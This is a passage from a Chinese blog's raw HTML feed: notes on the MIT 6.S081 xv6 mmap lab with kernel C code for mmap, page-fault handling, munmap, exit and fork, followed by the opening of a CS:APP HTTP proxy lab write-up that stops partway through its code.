class="hljs-title">file</span>;</span><br>    <span class="hljs-type">int</span> length, prot, flags, offest;<br>    uint64 erro = <span class="hljs-number">0xffffffffffffffff</span>;<br><br>    <span class="hljs-comment">// 取出参数</span><br>    <span class="hljs-keyword">if</span> (argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">1</span>, &amp;length) &lt; <span class="hljs-number">0</span><br>        || argint(<span class="hljs-number">2</span>, &amp;prot) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">3</span>, &amp;flags) &lt; <span class="hljs-number">0</span><br>        || argfd(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, &amp;file) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">5</span>, &amp;offest) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> erro;<br>    &#125;<br>    <span class="hljs-comment">// 权限不对</span><br>    <span class="hljs-keyword">if</span> (file-&gt;writable == <span class="hljs-number">0</span> &amp;&amp; flags == MAP_SHARED &amp;&amp; (prot &amp; PROT_WRITE)) &#123;<br>        <span class="hljs-keyword">return</span> erro;<br>    &#125;<br>    <span class="hljs-comment">// 地址不够了</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>    <span class="hljs-keyword">if</span> (p-&gt;sz + length &gt; MAXVA) &#123;<br>        <span class="hljs-keyword">return</span> erro;<br>    &#125;<br>    <span class="hljs-comment">// 分配地址，找出一个空闲的vma</span><br>    addr = p-&gt;sz;<br>    p-&gt;sz += length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid == <span class="hljs-number">0</span>) &#123;<br>            p-&gt;vmas[i].valid = <span class="hljs-number">1</span>;<br>            p-&gt;vmas[i].addr = addr;<br>            p-&gt;vmas[i].flag = flags;<br>            p-&gt;vmas[i].length = length;<br>            p-&gt;vmas[i].prot = prot;<br>            p-&gt;vmas[i].file = file;<br>            filedup(file);<br>            <span class="hljs-keyword">return</span> addr;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> erro;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="usertrap"><a href="#usertrap" class="headerlink" title="usertrap"></a>usertrap</h2><p>修改<code>usertrap</code>函数，使得vma相关的地址能够被正确处理</p><ol><li>首先应该通过<code>r_scause</code>捕获异常</li><li>判断地址的合法性<ol><li>压根不在vma管辖范围内<ol><li>不能超出当前进程的虚拟地址范围，即<code>p-&gt;sz</code></li><li>不能低于栈区</li><li>在进程的vma数组中找不到对应的地址</li></ol></li><li>权限合法性<ol><li>通过<code>r_scause</code>可以知道当前是读还是写操作，通过文件的类型，可以确定是否有这个权限</li></ol></li></ol></li><li><code>kalloc</code>分配一个物理页面</li><li><code>readi</code>将文件的内容读入物理页面，其中偏移部分通过当前地址和vma记录的addr做差值得到，因为一读就是一个页面，因此还要将这个偏移向PGSIZE舍入</li><li>将映射关系通过<code>uvmmap</code>写入到页表</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (r_scause() == <span class="hljs-number">13</span> || r_scause() == <span class="hljs-number">15</span>) &#123;<br>        <span class="hljs-comment">// #ifdef LAB_MMAP</span><br>        <span class="hljs-keyword">if</span> (mmap_handler(r_stval(), r_scause()) == <span class="hljs-number">-1</span>) &#123;<br>            p-&gt;killed = <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-comment">// #endif</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((which_dev = devintr()) != <span class="hljs-number">0</span>) &#123;<br>    <br>    <br><span class="hljs-type">int</span> mmap_handler(uint64 va, uint64 r_cause) &#123;<br>    <span class="hljs-keyword">struct</span> proc *p = myproc();<br>    <span class="hljs-comment">// 地址不合法</span><br>    <span class="hljs-keyword">if</span> (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 是否和vma有关系</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid == <span class="hljs-number">1</span> &amp;&amp; (va &gt;= p-&gt;vmas[i].addr &amp;&amp; va &lt; p-&gt;vmas[i].addr + p-&gt;vmas[i].length)) &#123;<br>            vma = &amp;p-&gt;vmas[i];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 和vma没关系</span><br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 和vma是有关的</span><br>    <span class="hljs-comment">// 看看权限是否正确</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;file;<br>    <span class="hljs-comment">// 不能读，但是你读了</span><br>    <span class="hljs-keyword">if</span> (!file-&gt;readable &amp;&amp; r_cause == <span class="hljs-number">13</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 不能写，但是你写了</span><br>    <span class="hljs-keyword">if</span> (!file-&gt;writable &amp;&amp; r_cause == <span class="hljs-number">15</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 构建pte的标志位</span><br>    <span class="hljs-type">int</span> pte_flag = PTE_U;<br>    <span class="hljs-keyword">if</span> (vma-&gt;prot &amp; PROT_READ) &#123;<br>        pte_flag |= PTE_R;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vma-&gt;prot &amp; PROT_WRITE) &#123;<br>        pte_flag |= PTE_W;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vma-&gt;prot &amp; PROT_EXEC) &#123;<br>        pte_flag |= PTE_X;<br>    &#125;<br>    <span class="hljs-comment">// 先分配一个物理页面</span><br>    uint64 pa = (uint64)kalloc();<br>    <span class="hljs-keyword">if</span> (pa == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)pa, <span class="hljs-number">0</span>, PGSIZE);<br>    <span class="hljs-comment">// 成功分配物理页面，从文件中读</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">ip</span> =</span> file-&gt;ip;<br>    ilock(ip);<br>    <span class="hljs-comment">// 读取失败</span><br>    <span class="hljs-keyword">if</span> (readi(ip, <span class="hljs-number">0</span>, pa, PGROUNDDOWN(va - vma-&gt;addr), PGSIZE) == <span class="hljs-number">0</span>) &#123;<br>        iunlock(ip);<br>        kfree((<span class="hljs-type">void</span> *)pa);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    iunlock(ip);<br>    <span class="hljs-comment">// 加入映射</span><br>    <span class="hljs-keyword">if</span> (mappages(p-&gt;pagetable, PGROUNDDOWN(va), PGSIZE, pa, pte_flag) != <span class="hljs-number">0</span>) &#123;<br>        kfree((<span class="hljs-type">void</span> *)pa);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h2><blockquote><p>lab对munmap的情况做了简化，只会从头开始unmap，因此在将数据写回磁盘时，直接调用filewrite函数，它在内部会自动调用file的偏移</p></blockquote><p>munmap就是取消某部分虚拟地址的mmap</p><ol><li>在进程的vma数组找到对应的vma</li><li>更新vma中的addr和length，如果当前length&#x3D;0，说明全部被写入了，那么就通过fileclose关闭这个文件，并且将这个vma的valid修改为0。这个关闭的操作最好放到最后，因为我们可能在第3步还要写这个文件</li><li>如果需要写入，则通过filewrite函数写入磁盘，这个函数的参数很简单，第一个是文件的指针，第二个是起始的虚拟地址，第三个是length</li><li>将进程的页表给<code>uvmunmap</code>掉，因为lab的仁慈，这里的参数传递也很简单，addr全都是PGSIZE的倍数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_munmap</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    uint64 addr;<br>    <span class="hljs-type">int</span> length;<br>    <span class="hljs-keyword">if</span> (argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">1</span>, &amp;length) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 先找到对应vma</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid == <span class="hljs-number">1</span> &amp;&amp; (addr &gt;= p-&gt;vmas[i].addr &amp;&amp; addr &lt; p-&gt;vmas[i].addr + p-&gt;vmas[i].length)) &#123;<br>            vma = &amp;p-&gt;vmas[i];<br>            <span class="hljs-comment">// 头部</span><br>            <span class="hljs-keyword">if</span> (vma-&gt;addr == addr) &#123;<br>                vma-&gt;addr += length;<br>                vma-&gt;length -= length;<br>                <span class="hljs-comment">// 尾部</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (addr + length == vma-&gt;addr + vma-&gt;length) &#123;<br>                vma-&gt;length -= length;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果是shared，需要先写回磁盘</span><br>    <span class="hljs-keyword">if</span> (vma-&gt;flag == MAP_SHARED) &#123;<br>        filewrite(vma-&gt;file, addr, length);<br>    &#125;<br>    <span class="hljs-comment">// 修改页表</span><br>    uvmunmap(p-&gt;pagetable, addr, length / PGSIZE, <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//如果map区域为0</span><br>    <span class="hljs-keyword">if</span> (vma-&gt;length == <span class="hljs-number">0</span>) &#123;<br>        fileclose(vma-&gt;file);<br>        vma-&gt;valid = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有几个小补丁要打，分别是<code>uvmunmap</code>和<code>uvmcopy</code>，它们在查找页表的时候，如果发现pte无效，会panic，这里直接忽略，因为可能是mmap还没有分配物理地址的区域</p><h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>这个函数是用于进程死亡时，就所有的mmap区域都给删掉</p><ol><li>遍历进程的所有vma</li><li>如果vma有效<ol><li>如果需要写入磁盘，那就写入磁盘</li><li>更新页表</li><li>关闭文件</li><li>设置vma无效</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 将所有的映射区取消</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> &amp;p-&gt;vmas[i];<br>        <span class="hljs-keyword">if</span> (vma-&gt;flag == MAP_SHARED) &#123;<br>            filewrite(vma-&gt;file, vma-&gt;addr, vma-&gt;length);<br>        &#125;<br>        fileclose(vma-&gt;file);<br>        vma-&gt;valid = <span class="hljs-number">0</span>;<br>        uvmunmap(p-&gt;pagetable, vma-&gt;addr, vma-&gt;length / PGSIZE, <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p>这个函数主要用于子进程将父进程的mmap区域都给拷贝过来，要不然子进程一旦访问还没有分配物理地址的mmap区域，在usertrap里就不能正确处理它了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 将父进程的mmap也拷贝给它</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> &amp;p-&gt;vmas[i];<br>    <span class="hljs-keyword">if</span> (vma-&gt;valid) &#123;<br>        memmove(&amp;np-&gt;vmas[i], vma, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> vma));<br>        filedup(vma-&gt;file);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab7</title>
    <link href="/2023/08/08/csapp-lab7/"/>
    <url>/2023/08/08/csapp-lab7/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224203110.png" alt="20231224203110"></p><p>前情提要，如果看了书本，这个lab难度不高，但是如果不看书，难度还是挺高的，并且这个lab会用到cachelab中学到的东西，需要阅读</p><ol><li>第十章：系统编程</li><li>第十一章：网络编程</li><li>第十二章：并发</li></ol><h1 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h1><ol><li>使用代理完成客户端和服务器的连接（HTTP操作，socket通信）<ol><li>接受客户端的连接，读并分析请求</li><li>将请求发送给服务器</li><li>读取服务器的回应，并将回应发送给对应的客户端</li></ol></li><li>实现多线程的功能</li><li>增加cache功能</li></ol><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>测试：.&#x2F;driver.sh<br>50 15 15</p><h1 id="第一部分：实现一个顺序的网络代理"><a href="#第一部分：实现一个顺序的网络代理" class="headerlink" title="第一部分：实现一个顺序的网络代理"></a>第一部分：实现一个顺序的网络代理</h1><h2 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h2><ol><li>最开始，代理应该监听某个端口来等待连接的请求，这个端口通过命令行给出</li><li>一旦建立连接，代理应该读取并解析请求。它需要确定这个请求是否发送了一个合法的HTTP请求</li><li>如果这个请求合法，则发送给服务器，然后将服务器的response返回给客户</li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><ol><li><code>main</code>函数打开一个监听的描述符，如果通过这个监听描述符<code>accept</code>成功了，则打开了一个用于通信的描述符<code>fd</code>，将<code>fd</code>作为<code>doit</code>的函数，调用doit</li><li><code>doit</code>函数与描述符<code>b</code>建立通信，读取客户端发来的请求，这个请求一定是以下两种形式之一<ol><li>指定端口  <code>GET http://www.cmu.edu:8080/hub/index.html HTTP/1.1</code></li><li>固定端口80 <code>GET http://www.cmu.edu/hub/index.html HTTP/1.1</code></li></ol></li><li>将上面收到的请求分解，主要是得到中间的url，然后将url分解，得到<code>host</code>，<code>port</code>，<code>path</code>，以指定端口为例，这三个分别是<ol><li><code>www.cmu.edu</code></li><li><code>8080</code></li><li><code>/hub/index.html</code></li></ol></li><li>根据上面得到的三个参数，构建发往服务器的request</li><li>这个request是HTTP格式（具体实现上就把这个放到一个字符数组就行了，每一行通过<code>\r\n</code>隔开，并且最后要多一行<code>\r\n</code>），由请求头和请求行组成，实验文档要求格式如下：<ol><li><code>GET /hub/index.html HTTP/1.0</code></li><li><code>Host: www.cmu.edu</code></li><li><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</code></li><li><code>Connection: close</code></li><li><code>Proxy-Connection: close</code></li></ol></li><li>与服务器建立连接，得到<code>server_fd</code>描述符，将上面已经生成好的request发往服务器</li><li>不断地读服务器返回的值，写入<code>fd</code>文件描述符<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 8192</span><br><br><span class="hljs-comment">/* You won&#x27;t lose style points for including this long line in your code */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *user_agent_hdr =<br>    <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 &quot;</span><br>    <span class="hljs-string">&quot;Firefox/10.0.3\r\n&quot;</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>  <span class="hljs-type">char</span> host[MAXLINE];<br>  <span class="hljs-type">char</span> port[MAXLINE];<br>  <span class="hljs-type">char</span> path[MAXLINE];<br>&#125; URI;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cout_uri_format_error</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong uri format\n&quot;</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_line</span><span class="hljs-params">(URI *req_uri, <span class="hljs-type">char</span> *uri)</span> </span>&#123;<br>  <span class="hljs-type">char</span> *host_start = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;://&quot;</span>);<br>  <span class="hljs-keyword">if</span> (host_start == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">cout_uri_format_error</span>();<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  host_start += <span class="hljs-number">3</span>;<br>  <span class="hljs-type">char</span> *port_start = <span class="hljs-built_in">strstr</span>(host_start, <span class="hljs-string">&quot;:&quot;</span>);<br>  <span class="hljs-type">char</span> *path_start = <span class="hljs-built_in">strstr</span>(host_start, <span class="hljs-string">&quot;/&quot;</span>);<br>  <span class="hljs-keyword">if</span> (path_start == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">cout_uri_format_error</span>();<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(req_uri-&gt;path, path_start);<br>  *path_start = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (port_start != <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">strcpy</span>(req_uri-&gt;port, port_start + <span class="hljs-number">1</span>);<br>    *port_start = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">strcpy</span>(req_uri-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(req_uri-&gt;host, host_start);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build_req_server</span><span class="hljs-params">(<span class="hljs-type">char</span> *req_server, URI *req_uri)</span> </span>&#123;<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, req_uri-&gt;path);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%sHost: %s\r\n&quot;</span>, req_server, req_uri-&gt;host);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%s%s&quot;</span>, req_server, user_agent_hdr);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%sConnection: close\r\n&quot;</span>, req_server);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%sProxy-Connection: close\r\n&quot;</span>, req_server);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%s\r\n&quot;</span>, req_server);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span> </span>&#123;<br>  <span class="hljs-comment">// 初始化rio类函数的缓冲区</span><br>  <span class="hljs-type">rio_t</span> rio;<br>  <span class="hljs-built_in">Rio_readinitb</span>(&amp;rio, fd);<br>  <span class="hljs-comment">// 读入这一行http请求</span><br>  <span class="hljs-type">char</span> buf[MAXLINE];<br>  <span class="hljs-built_in">Rio_readlineb</span>(&amp;rio, buf, MAXLINE);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Request headers:\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);<br>  <span class="hljs-type">char</span> method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>  <span class="hljs-comment">// 解析这一行http请求，总共三个部分</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version) != <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HTTP Requset Format Wrong!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 判断是否是GET请求，这个比较函数忽略大小写，get也行</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcasecmp</span>(method, <span class="hljs-string">&quot;GET&quot;</span>)) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;method: %s not 